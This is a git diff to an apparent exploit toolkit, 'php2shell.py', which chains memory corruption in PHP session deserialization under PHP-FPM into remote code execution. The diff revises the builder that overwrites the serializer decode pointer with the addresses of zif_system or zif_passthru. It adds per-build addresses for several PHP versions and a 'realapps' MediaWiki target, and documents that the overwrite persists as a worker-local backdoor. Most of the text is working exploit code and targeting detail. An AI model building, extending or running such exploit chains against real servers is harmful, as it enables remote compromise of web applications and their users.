@@ -1,0 +1,547 @@
+diff --git a/USAGE.md b/USAGE.md
+index 79f3bee..57f193e 100644
+--- a/USAGE.md
++++ b/USAGE.md
+@@ -130,7 +130,11 @@ realapps profile is ET_EXEC non PIE as well, but its F12b target is the
+ `php` decode slot `0x22c54c8` (8 mod 16), reached through an 8 mod 16 fake B0f;
+ its record shape is not accepted by the offline builder.
+ 
+-Handler choice matters for the generic builder. The lab uses `php_binary`,
++Handler choice matters for the generic builder. The builder resolves the target
++from the profile entry named `php_binary` (`_serializer_entry`), not from
++`ps_serializers.default_target`: on the four lab profiles both point at the same
++slot, while on realapps `default_target` is the F12b `php` slot `0x22c54c8` and
++the `php_binary` slot is `0x22c54e0`. The lab uses `php_binary`,
+ whose decode slot is `table + 0x40` and 16 byte aligned. The default `php`
+ serializer decode slot is `table + 0x28` and is 8 mod 16. The generic builder
+ places the fake B0 at the 16 byte aligned stale B0, so its write slot is 0 mod
+@@ -269,14 +273,21 @@ re-encoder. With the 8.5.10 receipt geometry (`X1=0x7ffff7a6a000`,
+ `X2=0x7ffff7aae000`, `P=0x7ffff7a81000`, `B0=0x7ffff7a84000`, total 131014):
+ 
+ ```
+-rec1_len      = 107
+-Q             = payload_start = 0x77
++rec1_len      = 107             # 1 + 96-byte key + i:8976055;
++Q             = payload_start  # 0x77 (L has 6 decimal digits)
+ L             = 130893
+ F             = X2 + 0x18 + Q + 0x100 = 0x7ffff7aae18f
+ command       = X2 + 0x18 + Q + 0x118 = 0x7ffff7aae1a7
+ used_slots K  = (0x14c1b60 - (B0 + 0x10)) / 16 = -8796082913867
+ ```
+ 
++Q is derived from the record geometry, not fixed: the decimal width of the
++serialized zif address changes rec1. The lab zif values have 7 digits
++(`Q=0x77`); realapps `zif_passthru` `0xa3c074` is 10731636, 8 digits, so
++`Q=0x78`. The arg1 pointer F is always `X2 + 0x18 + Q + 0x100`; a hardcoded
++`0x77` would point one byte before F. The builder asserts this derivation on
++the assembled key1.
++
+ The record is `[0x60][96-byte key][i:<zif decimal address>;]` plus
+ `\x01zs:<L>:"<payload>";`; the fake P and B0 sit in the payload relative to X1,
+ and `F` is relative to X2. Hashes for the reference command
+@@ -293,6 +304,28 @@ HTTP 200 (`PID=1249787`), recreated the marker and kept the worker alive.
+ at `php_exec+450` is unconditionally non-canonical. There is no parameterless
+ way to avoid it for `zif_system`. `zif_passthru` is the preferred clean target.
+ 
++### Poison and worker recycling
++
++The overwrite is a write into `ps_serializers[...].decode` in the worker's
++private `.data` mapping. It is worker-local: the FPM master's copy is unchanged
++and other workers do not see it.
++
++- A non-crashing decode (for example `num_args=0` -> PHP `ArgumentCountError`)
++  leaves the slot patched. The worker stays alive and keeps serving with the
++  poisoned decode pointer.
++- With `pm.max_requests=0` the poison persists for the worker lifetime. A finite
++  limit only delays recycling until the request count is reached.
++- Only worker recycle/restart clears it. A crafted crashing decode (for example
++  `num_args=1` with an invalid arg pointer -> SIGSEGV in
++  `zend_str_has_nul_byte`) makes FPM respawn from the pristine master; the new
++  worker has the real decode pointer again.
++- A crash respawn is not remediation: any non-crashing request in between keeps
++  the backdoor. Kill/reload the pool workers explicitly after compromise.
++
++Receipt: `/tmp/opencode/research/realzif_20261022T013000Z/README.md` (worker
++slot stayed `0xa3c074` after the clean and `num_args=0` decodes; the
++`num_args=1` crash respawned worker 143459 with `0x9e6dd5`).
++
+ | version | target slot | `zif_system` | `zif_passthru` | `php_exec_ex` | `php_exec` | state |
+ |---|---|---|---|---|---|---|
+ | 8.5.10 | `0x14c1b60` | `0x88f6a7` | `0x88f6b7` | `0x88f435` | `0x88f21f` | live G6, ASLR off |
+@@ -300,11 +333,13 @@ way to avoid it for `zif_system`. `zif_passthru` is the preferred clean target.
+ | 8.1.34 | `0xe01140` | `0x7348f9` | `0x734909` | `0x73467d` | `0x734467` | binary-derived |
+ | 7.4.33 | `0xe010a0` | `0x71dd66` | `0x71dd76` | `0x71daf7` | `0x71d7fc` | binary-derived |
+ 
+-`zif_passthru = zif_system + 0x10` on all four lab binaries, verified with
+-`nm -an` and `readelf -sW`. Only 8.5.10 is a live G6 run; the other symbols are
+-binary-derived profile data. G6 still needs X1, X2, P and B0, and no
+-ASLR-capable heap leak is demonstrated. The G6 proof is a private ASLR-off lab
+-run, not a real-target claim. Receipt:
++The delta is profile data, never a builder constant: `+0x10` on the four lab
++binaries, `+0x13` on realapps (`0xa3c061`/`0xa3c074`, both 19-byte symbols).
++The builder reads `zif_passthru` from the selected profile and cross-checks any
++`zif_route` delta; it never synthesizes `zif_system + 0x10`. Only 8.5.10 is a
++live G6 run; the other symbols are binary-derived profile data. G6 still needs
++X1, X2, P and B0, and no ASLR-capable heap leak is demonstrated. The G6 proof
++is a private ASLR-off lab run, not a real-target claim. Receipt:
+ `/tmp/opencode/research/g6zif_20261021T222434Z/README.md`.
+ 
+ ## F12b realapps zif decode (real-target RCE)
+@@ -368,11 +403,15 @@ respawned worker 1249940; nginx returned 502 (157 B), and a later
+ that ran the exploit did not.
+ 
+ The `zif_passthru` symbol on this binary is `0xa3c074` (verified with `nm -an`
+-and `readelf -sW`; `zif_system + 0x13`, not the lab `+0x10`). Its clean
+-real-target run is **pending** and is not claimed. F12b is a private ASLR-off
+-proof: the producer geometry is fixed, no ASLR-capable heap leak is
+-demonstrated (F14 attempted-negative; boot2 lab-only), and no ASLR-on or
+-internet exploitation is claimed. The profile
++and `readelf -sW`; `zif_system + 0x13`, not the lab `+0x10`). Its clean run on
++this F12b `php` slot (`0x22c54c8`) is **pending** and is not claimed. The
++separate `php_binary` entry (`ps_serializers[2]`, decode `0x22c54e0`) is the
++one exercised by the realzif receipt, where `zif_passthru` returned 200 on the
++same worker. The generic builder resolves the target by entry name, so on this
++profile it targets `0x22c54e0` rather than the profile's `default_target`
++(`0x22c54c8`). F12b is a private ASLR-off proof: the producer geometry is
++fixed, no ASLR-capable heap leak is demonstrated (F14 attempted-negative; boot2
++lab-only), and no ASLR-on or internet exploitation is claimed. The profile
+ `addresses/g2_fpm_realapps_8510.json` is selectable with `--g2-profile
+ realapps-8.5.10` (or its md5); `record_builder` is `php_session_zif`, so
+ `--step g2` (php_binary G6 shape only) rejects it with a pointer to the
+diff --git a/tool/modules/README.md b/tool/modules/README.md
+index cc4ed0a..5019afb 100644
+--- a/tool/modules/README.md
++++ b/tool/modules/README.md
+@@ -5,7 +5,7 @@
+ | `arm.py` | multipart `PHP_SESSION_UPLOAD_PROGRESS` request builder: arm/probe bodies, HTTP/1.1 framing helpers, 14-byte frozen-profile disclosure analyzer (consolidated from the pre-restructure `native-output-leak.py`; same functions and standalone CLI). |
+ | `native-output-leak-stock-arm.py` | author-provided reconstructed "STOCK" arm body (frozen-profile arm machinery record); consumed by the driver, keep as separate provenance module. |
+ | `compact-stock-tail.py` | author-provided reconstructed "COMPACT" rearm body + final forged multipart (the negative-`used_slots` controlled copy stage); consumed by `--step chain`. |
+-| `g2_chain.py` | G2/G6 FPM chain profiles for 8.5.10, 8.4.25, 8.1.34 and 7.4.33 (`addresses/g2_fpm_*.json`), plus the F12b realapps 8.5.10 `php`-handler profile (`addresses/g2_fpm_realapps_8510.json`, md5 `4ee099823b75e16ea36f93c71d57bfd8`, `zif_system` `0xa3c061`, `zif_passthru` `0xa3c074`), selected by version, binary md5 or path; and the offline `--step g2` record plan: `php_binary` (G2) or `zif_system`/`zif_passthru` (G6) decode, negative `used_slots` arithmetic, fake `php_unserialize_data` / `var_dtor_entries` placement, PS(serializer) slot, fake `zend_execute_data`, record bytes and self-checks. The F12b `php`-format record is built by the receipt's `scripts/mkrec.py`; its profile carries `record_builder: php_session_zif` and `--step g2` rejects it instead of emitting a php_binary record. No transport and no address guessing. |
++| `g2_chain.py` | G2/G6 FPM chain profiles for 8.5.10, 8.4.25, 8.1.34 and 7.4.33 (`addresses/g2_fpm_*.json`), plus the F12b realapps 8.5.10 `php`-handler profile (`addresses/g2_fpm_realapps_8510.json`, md5 `4ee099823b75e16ea36f93c71d57bfd8`, `zif_system` `0xa3c061`, `zif_passthru` `0xa3c074`), selected by version, binary md5 or path; and the offline `--step g2` record plan: `php_binary` (G2) or `zif_system`/`zif_passthru` (G6) decode, negative `used_slots` arithmetic, fake `php_unserialize_data` / `var_dtor_entries` placement, PS(serializer) slot, fake `zend_execute_data`, record bytes and self-checks. Targets are resolved by serializer entry name (`php_binary`), never `default_target`; the fake arg1 pointer is derived from the record-2 payload start Q; `zif_passthru` is read per profile (`+0x10` on the lab builds, `+0x13` on realapps), never synthesized. An overwrite is worker-local `.data` poison: it persists across non-crashing decodes and clears only on worker recycle; a crash respawn starts a pristine worker. The F12b `php`-format record is built by the receipt's `scripts/mkrec.py`; its profile carries `record_builder: php_session_zif` and `--step g2` rejects it instead of emitting a php_binary record. No transport and no address guessing. |
+ | `leak_stage.py` | mod_php leak stage, dry-only (`--step leak`): Set-Cookie PS(id) channel request shapes and the section C calibration plan; `leak_offset` is surfaced with its build binding (`addresses/apache_libphp.json`) and never guessed. |
+ | `producer.py` | facade over the CVE-109618 / CVE-109619 producer shape builders; mod_php producer TODO (missing module). |
+ | `producer_fpmwiki.py` | fpmwiki producer stage (`--step producer`): MediaWiki 1.46.2 anon-edit OOM, int N (5.7M receipt); offline byte-build default, `--live` gates the send, post_max_size ceiling guard. Promoted from the run_fpmwiki_20261021_173406 receipt. |
+diff --git a/tool/modules/g2_chain.py b/tool/modules/g2_chain.py
+index 521daed..a3f243d 100644
+--- a/tool/modules/g2_chain.py
++++ b/tool/modules/g2_chain.py
+@@ -23,7 +23,22 @@ MediaWiki/Wikibase binary: the active `php` serializer decode slot
+ record shape differs from the php_binary G6 builder, so the profile carries
+ `record_builder: php_session_zif` and is rejected by the offline builder with a
+ pointer to the receipt's `scripts/mkrec.py`; `zif_passthru` 0xa3c074 is symbol
+-verified but its clean real-target run is pending.
++verified but its clean run on that `php` slot is pending. The separate realapps
++`php_binary` slot (0x22c54e0) has its own clean `zif_passthru` run in the
++realzif receipt.
++
++The writer always resolves its target by serializer entry name, `php_binary`,
++rather than by a fixed index or by `ps_serializers.default_target`: the lab
++profiles put `php_binary` at the default target, but the realapps profile's
++default target is the F12b `php` slot. The fake execute_data arg1 pointer is
++derived from the record-2 payload start Q:
++``F = X2 + 0x18 + Q + 0x100``. Q shifts with the decimal width of the written
++zif address (0x77 for a seven-digit lab value, 0x78 for realapps 0xa3c074), so
++F must never use a fixed Q. `zif_passthru` is profile data, never
++`zif_system + 0x10`: the delta is +0x10 on the four lab builds and +0x13 on
++realapps. A decode overwrite is worker-local `.data` poison: it persists across
++non-crashing decodes and is cleared only by worker recycle; FPM's crash respawn
++starts a pristine worker.
+ 
+ This module is profile data plus arithmetic: it loads
+ addresses/g2_fpm_<build>.json selected by version, binary md5 or path, computes
+@@ -80,7 +95,9 @@ ZIF_ARG1_TYPE_OFF = 0x58
+ ZIF_ARG1_IS_STRING = 6
+ ZIF_RECEIPT = "/tmp/opencode/research/g6zif_20261021T222434Z"
+ PHP_BINARY_ZIF_BUILDER = "php_binary_zif"
++PHP_BINARY_SERIALIZER = "php_binary"
+ F12B_RECEIPT = "/tmp/opencode/research/f12b_zif_20261021T222457Z"
++REALZIF_RECEIPT = "/tmp/opencode/research/realzif_20261022T013000Z"
+ 
+ 
+ def _require_record_builder(profile: dict) -> None:
+@@ -210,6 +227,36 @@ def _long_value(value: str | bytes) -> bytes:
+     return value
+ 
+ 
++def _zif_delta(profile: dict) -> int | None:
++    """Return zif_passthru - zif_system from the profile when both exist.
++
++    The delta is build data, not a builder constant: +0x10 on the four lab
++    binaries and +0x13 on realapps (both symbols are 19-byte functions there).
++    A declared zif_route delta is cross-checked against the two addresses.
++    """
++    if profile.get("zif_system") is None or profile.get("zif_passthru") is None:
++        return None
++    system = hex_int(profile["zif_system"], "zif_system")
++    passthru = hex_int(profile["zif_passthru"], "zif_passthru")
++    delta = passthru - system
++    if delta <= 0:
++        raise ValueError(
++            f"zif_passthru 0x{passthru:x} does not follow "
++            f"zif_system 0x{system:x}"
++        )
++    declared = ((profile.get("zif_route") or {}).get("zif_passthru") or {}).get(
++        "delta_from_zif_system")
++    if declared is not None:
++        declared_token = str(declared).strip().split()[0].lstrip("+")
++        declared_value = hex_int(declared_token, "zif_passthru delta")
++        if declared_value != delta:
++            raise ValueError(
++                f"profile zif_route delta {declared!r} disagrees with "
++                f"zif_passthru - zif_system = +0x{delta:x}"
++            )
++    return delta
++
++
+ def _zif_symbol(profile: dict, decode: str) -> int:
+     """Return the profile's zif_system/zif_passthru address."""
+     if decode not in ZIF_DECODE_MODES:
+@@ -217,6 +264,8 @@ def _zif_symbol(profile: dict, decode: str) -> int:
+             "decode must be one of " + ", ".join(DECODE_MODES)
+             + f", not {decode!r}"
+         )
++    # Read the profile symbol; never synthesize zif_passthru as
++    # zif_system + 0x10 (realapps uses +0x13).
+     if decode not in profile:
+         raise ValueError(
+             f"profile {profile.get('name')!r} has no {decode} address; "
+@@ -225,6 +274,7 @@ def _zif_symbol(profile: dict, decode: str) -> int:
+     address = hex_int(profile[decode], f"{decode} address")
+     if not 0 < address < 1 << 64:
+         raise ValueError(f"{decode} address must be a positive 64 bit address")
++    _zif_delta(profile)
+     return address
+ 
+ 
+@@ -245,28 +295,84 @@ def _zif_command_bytes(command: str | bytes) -> bytes:
+     return command
+ 
+ 
++def _serializer_entry(profile: dict, name: str) -> dict:
++    """Resolve a ps_serializers entry by name and validate its real slot.
++
++    Table order is profile data, not an ABI constant: the realapps table has
++    `php` at index 1 and `php_binary` at index 2.  Resolve the entry by name,
++    then verify table + index * stride + 0x10 == decode before using it.
++    """
++    table = profile["ps_serializers"]
++    matches = [
++        candidate for candidate in table["entries"]
++        if candidate.get("name") == name
++    ]
++    if len(matches) != 1:
++        raise ValueError(
++            f"profile {profile.get('name')!r} has {len(matches)} "
++            f"ps_serializers entries named {name!r}; expected exactly one"
++        )
++    entry = matches[0]
++    index = entry.get("index")
++    if not isinstance(index, int) or isinstance(index, bool) or index < 0:
++        raise ValueError(
++            f"ps_serializers entry {name!r} has no non-negative integer index"
++        )
++    expected = (
++        hex_int(table["table"], "table")
++        + index * profile["structs"]["ps_serializer_size"]
++        + 0x10
++    )
++    actual = hex_int(entry["decode"], "decode slot")
++    if actual != expected:
++        raise ValueError(
++            f"ps_serializers[{index}] ({name}) decode 0x{actual:x} does not "
++            f"match table + index * stride + 0x10 = 0x{expected:x}"
++        )
++    return entry
++
++
+ def _decode_entry(profile: dict, target: int) -> dict | None:
+-    """Validate a serializer decode slot and return its profile entry."""
++    """Validate a serializer decode slot and return its profile entry.
++
++    A target outside the table (for example the PS(serializer) pointer route)
++    returns None.  A target that matches an entry is validated by name and by
++    the table arithmetic, and must be 16 byte aligned for the typed write.
++    """
+     table = profile["ps_serializers"]
+     entry = None
+     for candidate in table["entries"]:
+         decode = hex_int(candidate["decode"], "decode slot")
+         if decode == target:
+-            entry = candidate
+-            if not candidate.get("decode_16b_aligned"):
++            if entry is not None:
+                 raise ValueError(
+-                    f"ps_serializers[{candidate['index']}] "
+-                    f"({candidate['name']}) decode is not 16 byte aligned"
++                    f"more than one ps_serializers entry uses decode "
++                    f"0x{target:x}"
+                 )
+-    if entry is not None and target != (
+-        hex_int(table["table"], "table")
+-        + entry["index"] * profile["structs"]["ps_serializer_size"]
+-        + 0x10
+-    ):
+-        raise ValueError("ps_serializers entry arithmetic disagrees with the table")
++            entry = candidate
++    if entry is None:
++        return None
++    name = entry.get("name")
++    if name is not None:
++        _serializer_entry(profile, name)
++    if not entry.get("decode_16b_aligned"):
++        raise ValueError(
++            f"ps_serializers[{entry['index']}] ({name}) decode is not 16 byte "
++            "aligned"
++        )
+     return entry
+ 
+ 
++def _fake_zend_string_addr(x2: int, payload_start: int) -> int:
++    """F = ZSTR_VAL(X2) + Q + ZIF_F_PAYLOAD_OFF with Q from record geometry.
++
++    Q is the record-2 payload start.  It moves with the decimal width of the
++    serialized zif address (0x77 for a seven-digit lab value, 0x78 for the
++    eight-digit realapps 0xa3c074), so F must not use a fixed payload offset.
++    """
++    return x2 + 0x18 + payload_start + ZIF_F_PAYLOAD_OFF
++
++
+ def _overlaps(start_a: int, end_a: int, start_b: int, end_b: int) -> bool:
+     return start_a < end_b and start_b < end_a
+ 
+@@ -310,8 +416,14 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
+             profile_path = resolved_path
+     _require_record_builder(profile)
+     table = profile["ps_serializers"]
++    serializer = _serializer_entry(profile, PHP_BINARY_SERIALIZER)
++    if not serializer.get("decode_16b_aligned"):
++        raise ValueError(
++            f"ps_serializers[{serializer['index']}] ({PHP_BINARY_SERIALIZER}) "
++            "decode is not 16 byte aligned"
++        )
+     if target is None:
+-        target = hex_int(table["default_target"], "default target")
++        target = hex_int(serializer["decode"], "php_binary decode slot")
+     for name, address in (("x", x), ("p", p), ("b0", b0), ("target", target)):
+         if not 0 < address < 1 << 64:
+             raise ValueError(f"{name} must be a positive 64 bit address")
+@@ -326,19 +438,7 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
+         )
+     if target % 16:
+         raise ValueError(f"target 0x{target:x} is not 16 byte aligned")
+-    entry = None
+-    for candidate in table["entries"]:
+-        decode = hex_int(candidate["decode"], "decode slot")
+-        if decode == target:
+-            entry = candidate
+-            if not candidate.get("decode_16b_aligned"):
+-                raise ValueError(
+-                    f"ps_serializers[{candidate['index']}] ({candidate['name']}) "
+-                    "decode is not 16 byte aligned"
+-                )
+-    if entry is not None and target != hex_int(table["table"], "table") \
+-            + entry["index"] * profile["structs"]["ps_serializer_size"] + 0x10:
+-        raise ValueError("ps_serializers entry arithmetic disagrees with the table")
++    entry = _decode_entry(profile, target)
+ 
+     used_slots = used_slots_for(target, b0)
+     second_slot = target + 16
+@@ -417,6 +517,7 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
+         "route": "G2",
+         "decode": "php_binary",
+         "decode_kind": "php_binary",
++        "serializer": PHP_BINARY_SERIALIZER,
+         "status": profile["status"],
+         "binary": profile["binary"],
+         "build_id": profile["build_id"],
+@@ -442,6 +543,11 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
+             {"index": entry["index"], "name": entry["name"]}
+             if entry is not None else None
+         ),
++        "serializer_entry": {
++            "index": serializer["index"],
++            "name": serializer["name"],
++            "decode": serializer["decode"],
++        },
+         "ps_serializers": {
+             "table": table["table"],
+             "active_serializer_slot": table["active_serializer_slot"],
+@@ -484,13 +590,14 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+              decode: str = "zif_passthru", target: int | None = None,
+              profile: dict | None = None,
+              profile_path: Path | None = None) -> dict:
+-    """Offline G6 plan: point php_binary decode at zif_system or passthru.
++    """Offline G6 plan: point the php_binary decode slot at zif_system/passthru.
+ 
+-    The write target remains ps_serializers[2].decode; the value written is the
++    The write target is the profile entry named ``php_binary`` (resolved by
++    name, not by a fixed index or ``default_target``); the value written is the
+     selected zif handler address.  ``x`` is the first decode zend_string (the
+     planted T1 buffer), ``x2`` is the second decode zend_string (the re-encoded
+     T2 buffer).  P and B0 are relative to the first buffer, while the fake
+-    zend_string pointer F is relative to the second one.
++    zend_string pointer F is derived from the second buffer and Q.
+     """
+     if decode not in ZIF_DECODE_MODES:
+         raise ValueError(
+@@ -503,9 +610,16 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+             profile_path = resolved_path
+     _require_record_builder(profile)
+     table = profile["ps_serializers"]
++    serializer = _serializer_entry(profile, PHP_BINARY_SERIALIZER)
++    if not serializer.get("decode_16b_aligned"):
++        raise ValueError(
++            f"ps_serializers[{serializer['index']}] ({PHP_BINARY_SERIALIZER}) "
++            "decode is not 16 byte aligned"
++        )
+     zif = _zif_symbol(profile, decode)
++    zif_delta = _zif_delta(profile)
+     if target is None:
+-        target = hex_int(table["default_target"], "default target")
++        target = hex_int(serializer["decode"], "php_binary decode slot")
+     if x2 is None:
+         raise ValueError(
+             f"--g2-decode {decode} requires --g2-x2: the second decode "
+@@ -547,7 +661,7 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+     length, prefix_len, payload_start = _solve_lengths(total, rec1_len)
+     Q = payload_start
+     f_off = Q + ZIF_F_PAYLOAD_OFF
+-    f_addr = x2 + 0x18 + f_off
++    f_addr = _fake_zend_string_addr(x2, Q)
+     if f_addr >= 1 << 64:
+         raise ValueError("fake zend_string pointer overflows 64 bits")
+     p_off = p - (x + 24)
+@@ -562,6 +676,15 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+          "detail": decode},
+         {"check": "zif_symbol", "ok": 0 < zif < 1 << 64,
+          "detail": f"0x{zif:x}"},
++        {"check": "arg1_pointer_from_Q",
++         "ok": f_addr == x2 + 0x18 + Q + ZIF_F_PAYLOAD_OFF,
++         "detail": f"F=0x{f_addr:x} = X2+0x18 + Q 0x{Q:x} "
++                   f"+ 0x{ZIF_F_PAYLOAD_OFF:x}"},
++        {"check": "zif_passthru_profile_delta",
++         "ok": zif_delta is None or zif_delta > 0,
++         "detail": (f"zif_passthru - zif_system = +0x{zif_delta:x}"
++                    if zif_delta is not None
++                    else "profile carries a single zif symbol")},
+         {"check": "key1_length", "ok": ZIF_KEY1_BYTES == 96,
+          "detail": f"{ZIF_KEY1_BYTES} byte binary session key"},
+         {"check": "value_is_zif_address", "ok": True,
+@@ -618,6 +741,8 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+     prefix = b"\x01zs:" + str(length).encode("ascii") + b':"'
+     if len(prefix) != prefix_len:
+         raise ValueError("record 2 prefix length changed during construction")
++    if len(rec1) + len(prefix) != Q:
++        raise ValueError("record-2 payload start Q changed during construction")
+ 
+     payload = bytearray(length)
+     struct.pack_into(
+@@ -635,6 +760,9 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+         raise ValueError(f"record is {len(record)} bytes, expected {total}")
+     if record[0] != ZIF_KEY1_BYTES:
+         raise ValueError("key1 length byte mismatch")
++    if record[ZIF_ARG1_VALUE_OFF:ZIF_ARG1_VALUE_OFF + 8] != \
++            struct.pack("<Q", _fake_zend_string_addr(x2, Q)):
++        raise ValueError("arg1 pointer is not the Q-derived F address")
+     if record[payload_start + p_idx:payload_start + p_idx + 8] != \
+             struct.pack("<Q", p + 56):
+         raise ValueError("fake P placement mismatch")
+@@ -674,11 +802,18 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+         "zif_passthru is preferred when the worker must survive; zif_system "
+         "is a one-shot proof because the php_exec return-value write is "
+         "unavoidable for type=1",
+-        "real-target status: F12b pending, F14 attempted-negative, boot2 "
+-        "lab-only leak; the G6 proof is a private ASLR-off lab run",
++        "the decode overwrite is worker-local .data poison: it persists "
++        "across non-crashing decodes and is cleared only by worker recycle; "
++        "a crafted crash respawns a pristine worker but is not safe "
++        "remediation",
++        "real-target status: F12b php-slot zif_system confirmed one-shot; the "
++        "realapps php_binary slot zif_passthru clean run is in the realzif "
++        "receipt; F14 attempted-negative, boot2 lab-only leak; the G6 proof "
++        "is a private ASLR-off lab run",
+     ])
+     receipts = dict(profile.get("receipts") or {})
+     receipts.setdefault("G6", ZIF_RECEIPT)
++    receipts.setdefault("realzif", REALZIF_RECEIPT)
+ 
+     return {
+         "profile": profile["name"],
+@@ -688,6 +823,7 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+         "route": "G6",
+         "decode": decode,
+         "decode_kind": "zif",
++        "serializer": PHP_BINARY_SERIALIZER,
+         "clean": decode == "zif_passthru",
+         "one_shot": decode == "zif_system",
+         "target_behavior": target_behavior,
+@@ -720,6 +856,8 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+             "zif_passthru": (
+                 f"0x{hex_int(profile['zif_passthru'], 'zif_passthru'):x}"
+                 if profile.get("zif_passthru") is not None else None),
++            "zif_delta_from_system": (
++                f"0x{zif_delta:x}" if zif_delta is not None else None),
+             "php_exec_ex": (
+                 f"0x{hex_int(profile['php_exec_ex'], 'php_exec_ex'):x}"
+                 if profile.get("php_exec_ex") is not None else None),
+@@ -733,6 +871,11 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+             {"index": entry["index"], "name": entry["name"]}
+             if entry is not None else None
+         ),
++        "serializer_entry": {
++            "index": serializer["index"],
++            "name": serializer["name"],
++            "decode": serializer["decode"],
++        },
+         "ps_serializers": {
+             "table": table["table"],
+             "active_serializer_slot": table["active_serializer_slot"],
+@@ -756,6 +899,8 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
+             "num_args": 1,
+             "arg1_value_off": "0x50",
+             "arg1_value": f"0x{f_addr:x}",
++            "arg1_value_source": (
++                f"X2 + 0x18 + Q(0x{Q:x}) + 0x{ZIF_F_PAYLOAD_OFF:x}"),
+             "arg1_type_off": "0x58",
+             "arg1_type": ZIF_ARG1_IS_STRING,
+             "arg1_type_name": "IS_STRING",
+diff --git a/tool/php2shell.py b/tool/php2shell.py
+index 3a24a4e..969d5a1 100755
+--- a/tool/php2shell.py
++++ b/tool/php2shell.py
+@@ -238,9 +238,9 @@ def run_g2_step(args) -> int:
+ 
+     No transport exists on this path: --live is refused with a JSON error. The
+     php_binary record is built from operator supplied X, P and B0 plus the
+-    fixed .data decode slot or an explicit target. The zif_system/zif_passthru
+-    G6 modes additionally require X2, the second decode buffer. --step g2 never
+-    guesses an address and never opens a socket.
++    profile serializer entry named php_binary or an explicit target. The
++    zif_system/zif_passthru G6 modes additionally require X2, the second decode
++    buffer. --step g2 never guesses an address and never opens a socket.
+     """
+     if args.output is None:
+         stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
+@@ -825,7 +825,9 @@ def main() -> int:
+         choices=g2_chain_module.DECODE_MODES,
+         default="php_binary",
+         help="--step g2 decode mode: php_binary (G2), zif_passthru (G6 clean "
+-             "control) or zif_system (G6 one-shot); default php_binary",
++             "control) or zif_system (G6 one-shot); default php_binary; the "
++             "written decode pointer remains poisoned in that worker until "
++             "worker recycle",
+     )
+     parser.add_argument(
+         "--g2-p",
+@@ -855,8 +857,9 @@ def main() -> int:
+         "--g2-target",
+         default=None,
+         help="--step g2: 16-byte aligned write target (default: the profile "
+-             "ps_serializers[2].decode slot); for zif modes this remains the "
+-             "slot, while the written i:<n>; value is the profile zif address",
++             "serializer entry named php_binary, not default_target); for zif "
++             "modes this remains the slot, while the written i:<n>; value is "
++             "the profile zif address",
+     )
+     parser.add_argument(
+         "--g2-value",
